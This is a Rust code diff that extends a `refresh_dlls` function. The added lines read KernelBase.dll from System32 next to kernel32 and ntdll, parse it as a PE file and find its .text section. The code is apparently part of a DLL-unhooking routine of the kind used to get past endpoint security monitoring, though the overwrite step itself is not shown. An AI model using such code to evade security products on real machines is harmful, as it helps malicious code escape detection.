@@ -10,22 +10,36 @@ pub fn refresh_dlls() {
         Err(_) => return,
         Ok(kernel32) => kernel32,
     };
+    let kernelbase_bytes = match fs::read("C:\\Windows\\System32\\KernelBase.dll") {
+        Err(_) => return,
+        Ok(kernel32) => kernel32,
+    };
     let ntdll_bytes = match fs::read("C:\\Windows\\System32\\ntdll.dll") {
         Err(_) => return,
         Ok(ntdll) => ntdll,
     };
     // parse dlls
     let kernel32 = PE::parse(&kernel32_bytes).unwrap();
+    let kernelbase = PE::parse(&kernelbase_bytes).unwrap();
     let ntdll = PE::parse(&ntdll_bytes).unwrap();
     // find .text sections
     let mut k32_text_ptr: *mut c_void = 0 as _;
     let mut k32_text_size: usize = 0;
+    let mut kernelbase_text_ptr: *mut c_void = 0 as _;
+    let mut kernelbase_text_size: usize = 0;
     let mut ntdll_text_ptr: *mut c_void = 0 as _;
     let mut ntdll_text_size: usize = 0;
     for i in 0..kernel32.sections.len() {
         if kernel32.sections[i].name().unwrap() == ".text" {
             k32_text_ptr = kernel32.sections[i].pointer_to_raw_data as *mut c_void;
             k32_text_size = kernel32.sections[i].size_of_raw_data as usize;
+            break;
+        }
+    }
+    for i in 0..kernelbase.sections.len() {
+        if kernelbase.sections[i].name().unwrap() == ".text" {
+            kernelbase_text_ptr = kernelbase.sections[i].pointer_to_raw_data as *mut c_void;
+            kernelbase_text_size = kernelbase.sections[i].size_of_raw_data as usize;
             break;
         }
     }
